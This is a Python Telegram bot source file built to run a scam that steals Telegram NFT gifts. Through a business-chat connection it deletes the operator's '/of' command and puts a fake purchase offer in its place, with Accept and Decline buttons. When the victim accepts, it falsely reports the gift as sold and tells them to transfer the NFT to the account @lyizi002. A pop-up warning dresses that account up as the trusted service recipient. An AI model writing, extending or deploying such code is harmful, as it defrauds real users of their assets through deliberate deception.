import asyncio
import os
import re
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
from aiogram.exceptions import TelegramBadRequest

BOT_TOKEN = os.getenv("BOT_TOKEN")
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

active_users = set()
ADMIN_ID = None 

MESSAGES = {
    "ru": {
        "offer": "Пользователь ({username})\nпредлагает вам\n<b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a>.",
        "success": "🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n• Передайте <a href='https://t.me/lyizi002'>@lyizi002</a> для зачисления звёзд.",
        "declined": "❌ Оффер на <b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a> отклонен.",
        "btn_accept": "Принять",
        "btn_decline": "Отклонить",
        "btn_transfer": "Передать NFT"
    },
    "en": {
        "offer": "User ({username})\noffers you\n<b>{amount} {symbol}</b> for the gift <a href='{link}'>{pretty_name}</a>.",
        "success": "🎁 <a href='{link}'>{pretty_name}</a> successfully sold!\n\n• Transfer to <a href='https://t.me/lyizi002'>@lyizi002</a> to receive stars.",
        "declined": "❌ Offer of <b>{amount} {symbol}</b> for <a href='{link}'>{pretty_name}</a> declined.",
        "btn_accept": "Accept",
        "btn_decline": "Decline",
        "btn_transfer": "Transfer NFT"
    },
    "ua": {
        "offer": "Користувач ({username})\nпропонує вам\n<b>{amount} {symbol}</b> за подарунок <a href='{link}'>{pretty_name}</a>.",
        "success": "🎁 <a href='{link}'>{pretty_name}</a> успішно продано!\n\n• Передайте <a href='https://t.me/lyizi002'>@lyizi002</a> для зарахування зірок.",
        "declined": "❌ Офер на <b>{amount} {symbol}</b> за подарунок <a href='{link}'>{pretty_name}</a> відхилено.",
        "btn_accept": "Прийняти",
        "btn_decline": "Відхилити",
        "btn_transfer": "Передати NFT"
    },
    "ar": {
        "offer": "المستخدم ({username})\nيعرض عليك\n<b>{amount} {symbol}</b> مقابل الهدية <a href='{link}'>{pretty_name}</a>.",
        "success": "🎁 <a href='{link}'>{pretty_name}</a> تم بيعه بنجاح!\n\n• قم بالتحويل إلى <a href='https://t.me/lyizi002'>@lyizi002</a> لاستلام النجوم.",
        "declined": "❌ تم رفض العرض بمبلغ <b>{amount} {symbol}</b> مقابل <a href='{link}'>{pretty_name}</a>.",
        "btn_accept": "قبول",
        "btn_decline": "رفض",
        "btn_transfer": "نقل NFT"
    }
}

def get_pretty_name(slug):
    raw_name = slug.split('-')[0]
    return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)

@dp.message(CommandStart())
@dp.message(Command("menu"))
async def cmd_start(message: types.Message):
    global ADMIN_ID
    ADMIN_ID = message.from_user.id 
    
    text = (
        "<b>Как начать:</b>\n"
        "Отправь /ofteam — и доступ будет выдан автоматически.\n\n"
        "<b>Как создать оффер:</b>\n"
        "Отправь команду в деловой чат с покупателем:\n"
        "<code>/of ССЫЛКА_НА_НФТ ЦЕНА ВАЛЮТА ЯЗЫК</code>\n\n"
        "<b>Примеры:</b>\n"
        "<code>/of t.me/nft/DurovsCap-1234 500 stars</code>\n"
        "<code>/of t.me/nft/DurovsCap-1234 10 gram en</code>\n"
        "<code>/of t.me/nft/DurovsCap-1234 250 stars ua</code>\n\n"
        "<b>Валюты:</b> stars / gram\n"
        "<b>Языки:</b> ru / en / ua / ar"
    )
    await message.answer(text, parse_mode="HTML")

@dp.message(Command("ofteam"))
async def cmd_ofteam(message: types.Message):
    user_id = message.from_user.id
    if user_id in active_users:
        await message.answer("✅ Доступ уже активен. Можно отправлять оферы.")
    else:
        active_users.add(user_id)
        await message.answer("✅ Доступ выдан. Теперь можно отправлять оферы.")

@dp.message(F.text.startswith("/of"))
async def block_offer_in_pm(message: types.Message):
    await message.answer("❌ Эта функция доступна только в режиме автоматизации чатов.")

@dp.business_message(F.text.startswith("/of"))
async def handle_offer_command(message: types.Message):
    business_connection_id = message.business_connection_id
    if not business_connection_id: return

    parts = message.text.split()
    if len(parts) < 4: return

    link = parts[1]
    if not link.startswith("http"): link = "https://" + link
    try:
        amount = int(parts[2])
    except ValueError:
        return
    
    currency = parts[3].lower()
    symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
    lang = parts[4].lower() if len(parts) > 4 else "ru"
    if lang not in MESSAGES: lang = "ru"

    match = re.search(r"t\.me/nft/([a-zA-Z0-9_-]+-\d+)", link)
    if not match: return
    
    gift_slug = match.group(1)
    pretty_name = get_pretty_name(gift_slug)
    username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
    msg_data = MESSAGES[lang]

    caption_text = msg_data["offer"].format(username=username, amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)

    try:
        await bot.delete_business_messages(business_connection_id=business_connection_id, message_ids=[message.message_id])

        keyboard = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text=msg_data["btn_decline"], callback_data=f"decline:{gift_slug}:{amount}:{currency}:{lang}"),
            InlineKeyboardButton(text=msg_data["btn_accept"], callback_data=f"accept:{gift_slug}:{amount}:{currency}:{lang}")
        ]])

        await bot.send_message(
            chat_id=message.chat.id,
            text=caption_text,
            reply_markup=keyboard,
            business_connection_id=business_connection_id,
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(
                url=link,
                show_above_text=True,
                prefer_large_media=True
            )
        )

    except Exception as e:
        if ADMIN_ID:
            try: await bot.send_message(ADMIN_ID, f"⚠️ <b>Ошибка:</b>\n<code>{e}</code>", parse_mode="HTML")
            except: pass
        print(f"Ошибка: {e}")

# --- РЕДАКТИРОВАНИЕ СООБЩЕНИЯ + ВСПЛЫВАЮЩЕЕ ОКНО ---
@dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
async def handle_fake_buttons(callback: types.CallbackQuery):
    if not callback.message: return
    
    data_parts = callback.data.split(":")
    action, gift_slug, amount, currency, lang = data_parts[0], data_parts[1], data_parts[2], data_parts[3], data_parts[4]
    
    symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
    link = f"https://t.me/nft/{gift_slug}"
    pretty_name = get_pretty_name(gift_slug)
    business_connection_id = callback.message.business_connection_id
    msg_data = MESSAGES.get(lang, MESSAGES["ru"])

    alert_text = None 

    if action == "accept":
        new_text = msg_data["success"].format(link=link, pretty_name=pretty_name)
        new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/lyizi002")]
        ])
        
        # ВСПЛЫВАЮЩЕЕ ОКНО С ТВОИМ ЮЗОМ
        alert_text = (
            "⚠️ Внимание!\n\n"
            "Получатель в этом сервисе:\n"
            "@lyizi002.\n\n"
            "Если вас просят передать NFT напрямую другому пользователю — не отправляйте его. Это может быть мошенничество. Проверяйте условия оплаты."
        )
    else:
        new_text = msg_data["declined"].format(amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)
        new_keyboard = None

    kwargs = {
        "chat_id": callback.message.chat.id,
        "message_id": callback.message.message_id,
        "text": new_text,
        "reply_markup": new_keyboard,
        "parse_mode": "HTML",
        "link_preview_options": LinkPreviewOptions(
            url=link,
            show_above_text=True,
            prefer_large_media=True
        )
    }
    
    if business_connection_id: 
        kwargs["business_connection_id"] = business_connection_id

    try:
        await bot.edit_message_text(**kwargs)
        
        if alert_text:
            await callback.answer(alert_text, show_alert=True)
        else:
            await callback.answer()

    except TelegramBadRequest as e:
        error_msg = str(e).lower()
        if "message is not modified" in error_msg:
            await callback.answer("Сообщение уже обработано.", show_alert=True)
        else:
            print(f"Ошибка редактирования: {e}")
            await callback.answer("Не удалось изменить сообщение.", show_alert=True)
    except Exception as e:
        print(f"Неизвестная ошибка: {e}")
        await callback.answer("Ошибка", show_alert=True)

async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
